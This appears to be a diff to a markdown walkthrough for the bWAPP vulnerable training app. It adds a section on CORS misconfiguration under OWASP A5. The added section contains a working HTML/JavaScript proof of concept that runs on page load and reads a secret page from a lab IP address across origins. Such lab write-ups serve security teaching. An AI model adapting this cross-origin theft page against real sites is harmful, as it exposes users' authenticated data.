@@ -284,6 +284,32 @@ Use Burp to unhide hidden ticket price field, or use proxy to modify the POST pa
 
 # A5 - Security Misconfiguration
 
+### Cross-Origin Resource Sharing (AJAX)
+It's possible because of header in response:
+```
+Access-Control-Allow-Origin: *
+```
+```
+<html>
+    <head>
+    <script>
+        function steal() {
+            var r = new XMLHttpRequest();
+            r.onreadystatechange = function() {
+                if (r.readyState == 4 && r.status == 200) {
+                    alert(r.responseText);
+                }
+            };
+            r.open("GET", "http://192.168.1.10/bWAPP/secret-cors-1.php", true);
+            r.send();
+        }
+    </script>
+    </head>
+    <body onload="steal()">
+    </body>
+</html>
+```
+
 ### Cross-Site Tracing (XST) 
 
 Doesn't work on modern browsers as there are security enforcements.  Maybe use phantomJS?
